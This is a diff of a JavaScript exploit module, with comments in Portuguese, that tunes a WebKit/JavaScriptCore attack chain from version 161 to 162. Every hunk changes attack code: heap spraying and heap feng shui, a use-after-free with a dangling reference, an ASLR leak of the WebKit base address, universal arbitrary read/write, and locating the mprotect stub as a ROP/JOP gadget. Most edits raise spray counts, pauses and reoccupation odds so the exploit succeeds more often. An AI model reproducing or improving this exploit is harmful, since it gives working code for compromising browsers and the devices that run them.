@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v161 - Timing Extremo e Guardas de Heap Refinadas)
+// js/script3/testArrayBufferVictimCrash.mjs (v162 - Reocupação Maximizada e Verificação de Conteúdo)
 
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
@@ -26,14 +26,14 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v161_TIMING_GUARDAS";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v162_MAX_REOCUP";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
 const LOCAL_SHORT_PAUSE = 100;
 const LOCAL_MEDIUM_PAUSE = 750;
 const LOCAL_LONG_PAUSE = 1500;
-const LOCAL_CRITICAL_PAUSE = 4000; // Aumentado para 4s
+const LOCAL_CRITICAL_PAUSE = 5000; // Aumentado para 5s
 
 let global_spray_objects = [];
 let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente
@@ -238,11 +238,11 @@ async function triggerGC(logFn, pauseFn, aggressive = true) {
     logFn("    Acionando GC...", "info", "GC_Trigger");
     if (aggressive) {
         try {
-            for (let k = 0; k < 7; k++) { // Aumentar ciclos para 7
+            for (let k = 0; k < 8; k++) { // Aumentar ciclos para 8
                 let temp_spray = [];
                 // Variar mais os tamanhos para introduzir mais fragmentação e forçar diferentes buckets
-                const sizes = [1024 * 512, 1024 * 256, 1024 * 128, 1024 * 64, 1024 * 32, 1024 * 16, 1024 * 8, 1024 * 4]; // Mais tamanhos
-                for (let i = 0; i < 6000; i++) { // Aumentar iterações por ciclo para maior pressão (aprox. 3GB/ciclo)
+                const sizes = [1024 * 512, 1024 * 256, 1024 * 128, 1024 * 64, 1024 * 32, 1024 * 16, 1024 * 8, 1024 * 4, 1024 * 2]; // Mais tamanhos
+                for (let i = 0; i < 7000; i++) { // Aumentar iterações por ciclo para maior pressão (aprox. 3.5GB/ciclo)
                     temp_spray.push(new ArrayBuffer(sizes[i % sizes.length]));
                 }
                 temp_spray = null;
@@ -263,7 +263,7 @@ async function triggerGC(logFn, pauseFn, aggressive = true) {
         gc();
     }
     await pauseFn(LOCAL_CRITICAL_PAUSE);
-    for (let i = 0; i < 1000; i++) { // Aumentar alocações pequenas para preencher micro-buracos
+    for (let i = 0; i < 1500; i++) { // Aumentar alocações pequenas para preencher micro-buracos
         new ArrayBuffer(1024);
     }
     await pauseFn(LOCAL_CRITICAL_PAUSE);
@@ -277,15 +277,15 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     const VICTIM_SIZE_DOUBLES = VICTIM_SIZE_BYTES / 8; // 16 doubles
 
     // Heap Feng Shui: Criar buracos específicos para a vítima
-    const HOLE_COUNT = 7000; // Aumentar o número de buracos
+    const HOLE_COUNT = 10000; // Aumentar o número de buracos
     const HOLE_SIZE_BYTES = VICTIM_SIZE_BYTES; // Tentar tamanho EXATO da vítima
     let hole_fillers = [];
     let guard_fillers_pre_victim = []; // Guardas antes da vítima
 
     // Preencher o heap com objetos de tamanhos ligeiramente diferentes do alvo
     for (let i = 0; i < HOLE_COUNT; i++) {
-        hole_fillers.push(new ArrayBuffer(HOLE_SIZE_BYTES + (i % 32) + 0x10));
-        if (i % 200 === 0) await pauseFn(LOCAL_VERY_SHORT_PAUSE);
+        hole_fillers.push(new ArrayBuffer(HOLE_SIZE_BYTES + (i % 64) + 0x10)); // Variação de tamanho + offset para evitar colisão direta
+        if (i % 500 === 0) await pauseFn(LOCAL_VERY_SHORT_PAUSE);
     }
     await pauseFn(LOCAL_SHORT_PAUSE);
 
@@ -293,10 +293,10 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     const victim_holes_to_free = [];
     for (let i = 0; i < HOLE_COUNT; i += 2) { // Liberar a cada 2 objetos para criar espaços
         victim_holes_to_free.push(hole_fillers[i]);
-        hole_fillers[i] = null;
+        hole_fillers[i] = null; // Torna elegível para GC
         // Colocar guardas entre os buracos liberados para tentar isolar o slot da vítima
         if (i + 1 < HOLE_COUNT) {
-            guard_fillers_pre_victim.push(new ArrayBuffer(VICTIM_SIZE_BYTES + 0x20 + (i % 8))); // Guarda de tamanho diferente
+            guard_fillers_pre_victim.push(new ArrayBuffer(VICTIM_SIZE_BYTES + 0x40 + (i % 16))); // Guarda de tamanho diferente
         }
     }
     hold_objects.push(guard_fillers_pre_victim); // Manter os guardas vivos
@@ -318,7 +318,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     dangling_ref = victim_object_arr;
 
     // Aumentar iterações e pausas para forçar mais otimizações JIT na vítima.
-    for (let i = 0; i < 30000; i++) { // Mais iterações ainda
+    for (let i = 0; i < 40000; i++) { // Mais iterações ainda
         victim_object_arr[0] += 0.000000000000001;
     }
     await pauseFn(LOCAL_VERY_SHORT_PAUSE);
@@ -331,7 +331,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     logFn("--- FASE 3: Forçando Coleta de Lixo para liberar a memória do objeto vítima ---", "subtest");
     const ref_index = hold_objects.indexOf(victim_object_arr);
     if (ref_index > -1) { hold_objects.splice(ref_index, 1); }
-    victim_object_arr = null;
+    victim_object_arr = null; // Remove a referência forte.
     victim_holes_to_free.forEach((h, idx) => {
         if (h !== null) victim_holes_to_free[idx] = null;
     });
@@ -342,7 +342,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
 
     logFn("--- FASE 4: Pulverizando Float64Array com ponteiros sobre a memória liberada (SPRAY FENG SHUI) ---", "subtest");
     const spray_arrays = [];
-    const SPRAY_COUNT_UAF_NEW = 200000; // Aumentado para 200.000 (maior chance de hit)
+    const SPRAY_COUNT_UAF_NEW = 300000; // Aumentado para 300.000 (maior chance de hit)
 
     const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000);
     const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
@@ -371,10 +371,13 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
         }
     }
     hold_objects.push(spray_arrays);
+    // Libere os guardas AGORA, após o spray de reocupação, para não interferir na reocupação.
+    guard_fillers_pre_victim = null;
     logFn(`    Pulverização de ${spray_arrays.length} Float64Array(s) de ${VICTIM_SIZE_BYTES} bytes concluída sobre a memória da vítima.`, "info");
 
+
     // Forçar re-leitura/re-otimização da dangling_ref após o spray
-    for (let i = 0; i < 20; i++) { // Mais tentativas de "refrescar" o cache
+    for (let i = 0; i < 25; i++) { // Mais tentativas de "refrescar" o cache
         const temp_read = dangling_ref[0];
         try {
             dangling_ref[1] = 0xBADDC0DE;
@@ -391,7 +394,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
-    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v160_ALOCACAO_PRECISA";
+    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v162_MAX_REOCUP";
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");
 
     let final_result = { success: false, message: "Exploração falhou ou não pôde ser verificada.", details: {} };
@@ -416,7 +419,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos OTIMIZADO) ---", "subtest");
         const sprayStartTime = performance.now();
-        const SPRAY_COUNT = 2000000; // Aumentado para 2.000.000 para estabilização máxima
+        const SPRAY_COUNT = 2500000; // Aumentado para 2.500.000 para estabilização máxima
         logFn(`Iniciando spray de objetos (volume ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
         for (let i = 0; i < SPRAY_COUNT; i++) {
             const dataSize = 50 + (i % 50);
@@ -457,7 +460,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                  throw new Error("A referência pendurada não se tornou o Float64Array pulverizado.");
             }
 
-            let attempts = 80; // Aumentado para 80 tentativas de leitura para capturar o leak
+            let attempts = 100; // Aumentado para 100 tentativas de leitura para capturar o leak
             for(let i = 0; i < attempts; i++) {
                 leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0];
                 if (typeof leaked_jsvalue_from_uaf_double === 'number' && !isNaN(leaked_jsvalue_from_uaf_double) && leaked_jsvalue_from_uaf_double !== 0) {
@@ -565,15 +568,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
         const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
-        const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);
+        const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset);
 
-        logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
-        const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4, logFn);
+        logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_check.toString(true)}`, "leak");
+        const mprotect_first_bytes_check = await arb_read_universal_js_heap(mprotect_addr_check, 4, logFn);
 
-        if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
-            logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
+        if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
+            logFn(`[REAL LEAK] LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
         } else {
-             logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
+             logFn(`[REAL LEAK] ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando para endereços de código.`, "error");
         }
 
         logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
